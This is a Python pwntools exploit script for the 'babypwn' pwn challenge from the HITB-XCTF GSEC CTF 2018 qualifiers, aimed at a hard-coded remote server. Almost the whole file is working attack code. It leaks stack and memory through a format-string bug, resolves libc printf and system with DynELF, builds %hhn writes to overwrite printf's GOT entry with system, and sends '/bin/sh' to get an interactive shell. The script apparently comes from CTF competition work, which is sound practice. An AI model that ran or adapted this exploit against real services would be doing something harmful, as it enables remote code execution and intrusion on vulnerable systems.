#!/usr/bin/env python
#HITB-XCTF GSEC CTF 2018 Quals | Pwn [babypwn - 277pts]
#@Abdelkader

from pwn import *

r = remote("47.75.182.113", 9999)

def exec_payload(payload):
        if '\n' in payload:
                return ""
        r.sendline("P0WN" + payload)
        r.recvuntil("P0WN")
        data = r.recvrepeat(0.5)
        log.info("%s => %s" % (repr(payload), repr(data)))
        return data

def print_stack(until):
        for i in xrange(1, until + 1):
                exec_payload('%' + str(i) + '$p')

#abdelkader@ubuntu:~/dirsearch-master$ nc 47.75.182.113 9999
#AAAA-%33$p
#AAAA-0x40076d

def find_leak_point():
        for i in xrange(1, 200):
                c = exec_payload('%' + str(i) + '$p' + 'XXXXXXXX' + 'YYYYYYYY')
                if '0x5959595959595959' in c:
                        return i

def leak(addr):
    addr &= (2**64 - 1)
    log.info('Leaking address %s' % hex(addr))
    r = exec_payload('%' + str(8) + '$s' + 'XXXXXXXX' + p64(addr))
    if r == '':
        return ''
    r = r[:r.index('XXXXXXXX')]
    if r == '(null)':
        return '\x00'
    else:
        return r + '\x00'

def find_plt_got():
	addr = dynamic_addr
	while True:
		x = d.leak.n(addr, 2)
		if x == '\x03\x00': # type PLTGOT
			addr += 8
			return u64(d.leak.n(addr, 8))
		addr += 0x10

def find_printf():
	addr = got_addr
	while True:
		x = d.leak.n(addr, 8)
		if x == p64(printf_addr):
			return addr
		addr += 8

def fmt_gen(addr, val):
	ret = ''
	curout = 4
	dist_to_addr = 12 + 8*20
	reader = (dist_to_addr / 8) + 7
	for i in range(8):
		diff = (val & 0xff) - curout
		curout = (val & 0xff)
		val /= 0x100
		if diff < 20:
			diff += 0x100
		ret += '%0' + str(diff) + 'u'
		ret += '%' + str(reader) + '$hhn'
		reader += 1
	assert(len(ret) < dist_to_addr)
	ret += 'A'*(dist_to_addr - len(ret))
	for i in range(8):
		ret += p64(addr + i)
	return ret	

offset_printf = 0x0000000000055800 
offset_system = 0x0000000000045390

d = DynELF(leak, 0x40076d) #0x40076d: addr_into_bin

dynamic_addr = d.dynamic

printf_addr = d.lookup('printf', 'libc')
system_addr = d.lookup('system', 'libc')

#got_addr = find_plt_got()

got_addr = 0x601000
printf_got = find_printf()
log.info('GOT Address: %s' % hex(got_addr))
log.info('printf@got : %s' % hex(printf_got))
log.info("printf: %#x",printf_addr)
log.info("system: %#x",system_addr)

log.info("Running exploit")
exec_payload(fmt_gen(printf_got, system_addr))
r.sendline('/bin/sh')
log.info("Opened shell")
r.interactive()

r.close()


